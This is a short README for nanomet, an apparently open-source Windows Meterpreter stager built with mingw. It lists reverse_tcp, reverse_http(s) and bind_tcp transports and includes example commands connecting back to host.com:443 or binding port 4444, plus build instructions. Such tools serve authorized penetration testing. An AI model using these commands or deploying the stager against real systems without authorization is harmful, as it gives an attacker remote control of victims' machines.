nanomet
=======

A "nano" meterpreter stager.  Copyright (c) 2014, Vlatko Kosturjak - kost
nanomet is tinymet modified to support compiling using mingw compilers.

Based on tinymet by Copyright (c) 2014, Sherif Eldeeb "eldeeb.net"
please visit http://tinymet.com for details

Usage
=======

Usage: nanomet.exe [transport] LHOST LPORT

Available transports are as follows:

* 0: reverse_tcp
* 1: reverse_http
* 2: reverse_https
* 3: bind_tcp

Example
========

use reverse_https and connect to host.com:443

    nanomet.exe 2 host.com 443

bind_tcp port 4444 on all interfaces

    nanomet.exe 3 0.0.0.0 4444


Building
========

Linux: 

    make CC=i586-mingw32msvc-gcc

Mac OS X:

    make CC=i386-mingw32-gcc

Microsoft Windows / Visual C++:

    nmake /f Makefile.vc

